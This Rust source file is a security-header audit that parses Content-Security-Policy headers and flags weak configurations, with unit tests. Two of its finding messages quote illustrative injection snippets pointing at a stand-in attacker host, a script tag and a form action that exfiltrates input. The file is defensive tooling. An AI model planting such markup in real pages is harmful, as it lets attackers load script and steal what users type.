//! `content_security_policy` — full CSP response-header audit.
//! T76 port of `src/contentSecurityPolicy.ts`.
//!
//! CSP is the foundational web-security header. It declares which
//! origins the browser can load resources from, which inline / eval'd
//! code patterns are permitted, and which DOM sinks are gated by
//! Trusted Types. A correctly-configured CSP is the single largest
//! XSS-mitigation control the web has.
//!
//! Detector philosophy: surface the defects that REAL incidents have
//! shown to matter — we don't lint the entire CSP-3 grammar; we focus
//! on directives whose absence or misconfiguration enabled actual
//! cross-site exfiltration in the public CVE record.
//!
//! Findings (mirror TS byte-for-byte):
//!
//!   * `csp.missing`                   warn
//!   * `csp.invalid`                   warn
//!   * `csp.script-unsafe-inline`      STRICT
//!   * `csp.script-unsafe-eval`        STRICT
//!   * `csp.script-wildcard`           STRICT
//!   * `csp.no-default-src`            warn
//!   * `csp.no-object-src`             warn
//!   * `csp.no-base-uri`               warn
//!   * `csp.no-form-action`            warn
//!   * `csp.no-frame-ancestors`        warn
//!   * `csp.no-trusted-types`          warn (SUPERSOCIETY)
//!
//! AVP-2 invariants: `unsafe_code = "deny"`, pure detector, no I/O.

use crate::url_helpers::is_localhost;
use crate::{AxisFinding, AxisSeverity};
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;

/// One parsed CSP directive.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
#[non_exhaustive]
pub struct CspDirective {
    /// Lowercased directive name.
    pub name: String,
    /// Source-list tokens (case preserved — keywords are lowercase
    /// per spec but host names are case-sensitive).
    pub tokens: Vec<String>,
}

/// Captured page state the detector consumes.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
#[non_exhaustive]
pub struct CspSnapshot {
    /// Top-level page URL.
    pub page_url: String,
    /// Localhost / loopback exemption.
    pub page_is_localhost: bool,
    /// Raw enforcing header value, or `None`.
    pub raw: Option<String>,
    /// Directives in declaration order.
    pub directives: Vec<CspDirective>,
    /// True iff header was present but no directive parsed.
    pub unparseable: bool,
}

fn header_lookup<'a>(headers: &'a BTreeMap<String, String>, name: &str) -> Option<&'a String> {
    headers
        .iter()
        .find(|(k, _)| k.eq_ignore_ascii_case(name))
        .map(|(_, v)| v)
}

/// Parse the enforcing CSP header into directives.
fn parse_csp(raw: &str) -> Vec<CspDirective> {
    let mut out = Vec::new();
    for part in raw.split(';') {
        let trimmed = part.trim();
        if trimmed.is_empty() {
            continue;
        }
        let mut tokens = trimmed.split_whitespace();
        let Some(name) = tokens.next() else {
            continue;
        };
        let name = name.to_ascii_lowercase();
        if name.is_empty() {
            continue;
        }
        let rest: Vec<String> = tokens.map(String::from).collect();
        out.push(CspDirective { name, tokens: rest });
    }
    out
}

/// Build a snapshot from a captured headers map.
pub fn build_csp_snapshot(page_url: &str, headers: &BTreeMap<String, String>) -> CspSnapshot {
    let page_is_localhost = is_localhost(page_url);
    let raw = header_lookup(headers, "content-security-policy").cloned();
    let Some(raw_str) = raw.clone() else {
        return CspSnapshot {
            page_url: page_url.to_owned(),
            page_is_localhost,
            raw: None,
            directives: Vec::new(),
            unparseable: false,
        };
    };
    let directives = parse_csp(&raw_str);
    let unparseable = !raw_str.trim().is_empty() && directives.is_empty();
    CspSnapshot {
        page_url: page_url.to_owned(),
        page_is_localhost,
        raw: Some(raw_str),
        directives,
        unparseable,
    }
}

/// Where the effective script-src came from.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ScriptSrcOrigin {
    ScriptSrc,
    DefaultSrc,
    None,
}

impl ScriptSrcOrigin {
    fn label(self) -> &'static str {
        match self {
            Self::ScriptSrc => "script-src",
            Self::DefaultSrc => "default-src",
            Self::None => "(none)",
        }
    }
}

fn resolve_script_src(directives: &[CspDirective]) -> (Vec<&str>, ScriptSrcOrigin) {
    if let Some(d) = directives.iter().find(|d| d.name == "script-src") {
        return (
            d.tokens.iter().map(String::as_str).collect(),
            ScriptSrcOrigin::ScriptSrc,
        );
    }
    if let Some(d) = directives.iter().find(|d| d.name == "default-src") {
        return (
            d.tokens.iter().map(String::as_str).collect(),
            ScriptSrcOrigin::DefaultSrc,
        );
    }
    (Vec::new(), ScriptSrcOrigin::None)
}

fn has_directive(directives: &[CspDirective], name: &str) -> bool {
    directives.iter().any(|d| d.name == name)
}

fn slice_for_log(s: &str, n: usize) -> String {
    s.chars().take(n).collect()
}

/// Pure detector: snapshot → findings.
pub fn detect_csp_issues(snap: &CspSnapshot) -> Vec<AxisFinding> {
    if snap.page_is_localhost {
        return Vec::new();
    }
    let mut out = Vec::new();

    if snap.raw.is_none() {
        out.push(AxisFinding {
            severity: AxisSeverity::Warn,
            kind: "csp.missing".into(),
            detail: "No Content-Security-Policy header on this page. Every script source, every image origin, every connect endpoint is allowed by default. CSP is the single largest XSS-mitigation control the web has — set at minimum 'default-src \\'self\\'; object-src \\'none\\'; base-uri \\'self\\'; form-action \\'self\\''.".into(),
        });
        return out;
    }

    if snap.unparseable {
        let raw_snippet = slice_for_log(snap.raw.as_deref().unwrap_or(""), 200);
        out.push(AxisFinding {
            severity: AxisSeverity::Warn,
            kind: "csp.invalid".into(),
            detail: format!(
                "Content-Security-Policy header is present but couldn't be parsed into any directive. Browsers ignore unparseable values. Header value: '{raw_snippet}'."
            ),
        });
        return out;
    }

    // script-src checks
    let (script_tokens, script_origin) = resolve_script_src(&snap.directives);
    if matches!(script_origin, ScriptSrcOrigin::None) {
        out.push(AxisFinding {
            severity: AxisSeverity::Warn,
            kind: "csp.no-default-src".into(),
            detail: "Content-Security-Policy declares neither 'default-src' nor 'script-src'. Scripts can load from any origin. Add at minimum 'default-src \\'self\\''.".into(),
        });
    } else {
        let from = script_origin.label();
        if script_tokens.contains(&"'unsafe-inline'") {
            out.push(AxisFinding {
                severity: AxisSeverity::Strict,
                kind: "csp.script-unsafe-inline".into(),
                detail: format!(
                    "{from} contains 'unsafe-inline' — once set, ANY HTML-injection sink becomes XSS. Use nonces ('nonce-<random>') or hashes ('sha256-<base64>') instead. Negates roughly 80% of CSP's protective value."
                ),
            });
        }
        if script_tokens.contains(&"'unsafe-eval'") {
            out.push(AxisFinding {
                severity: AxisSeverity::Strict,
                kind: "csp.script-unsafe-eval".into(),
                detail: format!(
                    "{from} contains 'unsafe-eval' — allows eval(), Function(), setTimeout(string), setInterval(string). Required only for legacy frameworks; modern code uses parse-time transforms."
                ),
            });
        }
        if script_tokens.contains(&"*")
            || script_tokens.contains(&"https:")
            || script_tokens.contains(&"http:")
        {
            out.push(AxisFinding {
                severity: AxisSeverity::Strict,
                kind: "csp.script-wildcard".into(),
                detail: format!(
                    "{from} contains a wildcard ('*' or scheme-only 'https:'/'http:') — every origin can serve script. CSP cannot stop an injected '<script src=//attacker.example>'. Restrict to specific origins (e.g. 'https://cdn.example.com')."
                ),
            });
        }
    }

    // Structural baseline directives
    if !has_directive(&snap.directives, "object-src") {
        out.push(AxisFinding {
            severity: AxisSeverity::Warn,
            kind: "csp.no-object-src".into(),
            detail: "No 'object-src' directive. Browsers still honour <object>, <embed>, <applet> if not explicitly blocked. Modern baseline: 'object-src \\'none\\''.".into(),
        });
    }
    if !has_directive(&snap.directives, "base-uri") {
        out.push(AxisFinding {
            severity: AxisSeverity::Warn,
            kind: "csp.no-base-uri".into(),
            detail: "No 'base-uri' directive. An attacker who controls a single '<base href>' element can hijack every relative URL on the page. Modern baseline: 'base-uri \\'self\\'' or 'base-uri \\'none\\''.".into(),
        });
    }
    if !has_directive(&snap.directives, "form-action") {
        out.push(AxisFinding {
            severity: AxisSeverity::Warn,
            kind: "csp.no-form-action".into(),
            detail: "No 'form-action' directive. An attacker-controlled '<form action=//attacker.example>' can exfiltrate input. Modern baseline: 'form-action \\'self\\''.".into(),
        });
    }
    if !has_directive(&snap.directives, "frame-ancestors") {
        out.push(AxisFinding {
            severity: AxisSeverity::Warn,
            kind: "csp.no-frame-ancestors".into(),
            detail: "No 'frame-ancestors' directive. Clickjacking surface. Modern baseline: 'frame-ancestors \\'none\\''. (xFrameOptions detector covers the same threat from the legacy-header angle.)".into(),
        });
    }
    if !has_directive(&snap.directives, "require-trusted-types-for") {
        out.push(AxisFinding {
            severity: AxisSeverity::Warn,
            kind: "csp.no-trusted-types".into(),
            detail: "No 'require-trusted-types-for' directive. Trusted Types is the W3C-blessed modern DOM-XSS-prevention layer — all writes to dangerous DOM sinks (innerHTML, outerHTML, document.write, eval'd setTimeout) MUST go through a typed policy, eliminating an entire class of DOM-based XSS at the platform level. Add 'require-trusted-types-for \\'script\\'' (and a 'trusted-types' policy list).".into(),
        });
    }

    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn page() -> &'static str {
        "https://example.com/"
    }

    fn build(headers: &[(&str, &str)]) -> CspSnapshot {
        let map: BTreeMap<String, String> = headers
            .iter()
            .map(|(k, v)| ((*k).to_owned(), (*v).to_owned()))
            .collect();
        build_csp_snapshot(page(), &map)
    }

    #[test]
    fn localhost_skipped() {
        let map = BTreeMap::new();
        let s = build_csp_snapshot("http://localhost/", &map);
        assert!(detect_csp_issues(&s).is_empty());
    }

    #[test]
    fn no_header_warns_missing() {
        let s = build(&[]);
        let f = detect_csp_issues(&s);
        assert!(f.iter().any(|x| x.kind == "csp.missing"));
    }

    #[test]
    fn unparseable_warns() {
        let s = build(&[("Content-Security-Policy", ";;;")]);
        let f = detect_csp_issues(&s);
        assert!(f.iter().any(|x| x.kind == "csp.invalid"));
    }

    #[test]
    fn parses_directives() {
        let s = build(&[(
            "Content-Security-Policy",
            "default-src 'self'; script-src 'self' https://cdn.example.com",
        )]);
        assert_eq!(s.directives.len(), 2);
        assert_eq!(s.directives[0].name, "default-src");
        assert_eq!(s.directives[1].name, "script-src");
        assert_eq!(s.directives[1].tokens.len(), 2);
    }

    #[test]
    fn unsafe_inline_is_strict() {
        let s = build(&[(
            "Content-Security-Policy",
            "script-src 'self' 'unsafe-inline'",
        )]);
        let f = detect_csp_issues(&s);
        assert!(f.iter().any(|x| {
            x.kind == "csp.script-unsafe-inline" && x.severity == AxisSeverity::Strict
        }));
    }

    #[test]
    fn unsafe_eval_is_strict() {
        let s = build(&[("Content-Security-Policy", "script-src 'unsafe-eval'")]);
        let f = detect_csp_issues(&s);
        assert!(f
            .iter()
            .any(|x| x.kind == "csp.script-unsafe-eval" && x.severity == AxisSeverity::Strict));
    }

    #[test]
    fn wildcard_star_is_strict() {
        let s = build(&[("Content-Security-Policy", "script-src *")]);
        let f = detect_csp_issues(&s);
        assert!(f
            .iter()
            .any(|x| x.kind == "csp.script-wildcard" && x.severity == AxisSeverity::Strict));
    }

    #[test]
    fn wildcard_https_scheme_is_strict() {
        let s = build(&[("Content-Security-Policy", "script-src https:")]);
        let f = detect_csp_issues(&s);
        assert!(f.iter().any(|x| x.kind == "csp.script-wildcard"));
    }

    #[test]
    fn wildcard_http_scheme_is_strict() {
        let s = build(&[("Content-Security-Policy", "script-src http:")]);
        let f = detect_csp_issues(&s);
        assert!(f.iter().any(|x| x.kind == "csp.script-wildcard"));
    }

    #[test]
    fn script_src_inherits_default_src_fallback() {
        // No script-src; default-src 'unsafe-inline' should still fire.
        let s = build(&[(
            "Content-Security-Policy",
            "default-src 'self' 'unsafe-inline'",
        )]);
        let f = detect_csp_issues(&s);
        assert!(f.iter().any(|x| x.kind == "csp.script-unsafe-inline"));
    }

    #[test]
    fn no_default_or_script_src_warns() {
        // Only an unrelated directive — neither default-src nor script-src present.
        let s = build(&[("Content-Security-Policy", "img-src 'self'")]);
        let f = detect_csp_issues(&s);
        assert!(f.iter().any(|x| x.kind == "csp.no-default-src"));
    }

    #[test]
    fn missing_baseline_directives_warn_individually() {
        // A policy that has script-src but no object-src / base-uri /
        // form-action / frame-ancestors / require-trusted-types-for
        let s = build(&[("Content-Security-Policy", "script-src 'self'")]);
        let f = detect_csp_issues(&s);
        for kind in [
            "csp.no-object-src",
            "csp.no-base-uri",
            "csp.no-form-action",
            "csp.no-frame-ancestors",
            "csp.no-trusted-types",
        ] {
            assert!(
                f.iter().any(|x| x.kind == kind),
                "missing-baseline finding {kind} should fire"
            );
        }
    }

    #[test]
    fn fully_locked_baseline_is_clean() {
        let s = build(&[(
            "Content-Security-Policy",
            "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; require-trusted-types-for 'script'",
        )]);
        let f = detect_csp_issues(&s);
        assert!(
            f.is_empty(),
            "fully-locked CSP should be silent, got: {f:#?}"
        );
    }

    #[test]
    fn header_lookup_case_insensitive() {
        let s = build(&[("CONTENT-SECURITY-POLICY", "default-src 'self'")]);
        assert_eq!(s.directives.len(), 1);
    }

    #[test]
    fn directive_name_lowercased() {
        let s = build(&[("Content-Security-Policy", "DEFAULT-src 'self'")]);
        assert_eq!(s.directives[0].name, "default-src");
    }

    #[test]
    fn snapshot_round_trips_through_serde() {
        let s = build(&[(
            "Content-Security-Policy",
            "default-src 'self'; script-src 'self' 'nonce-abc123'",
        )]);
        let j = serde_json::to_string(&s).expect("ser");
        let back: CspSnapshot = serde_json::from_str(&j).expect("de");
        assert_eq!(back.directives.len(), s.directives.len());
    }

    #[test]
    fn trailing_semicolon_tolerated() {
        let s = build(&[("Content-Security-Policy", "default-src 'self';;;")]);
        assert_eq!(s.directives.len(), 1);
    }
}
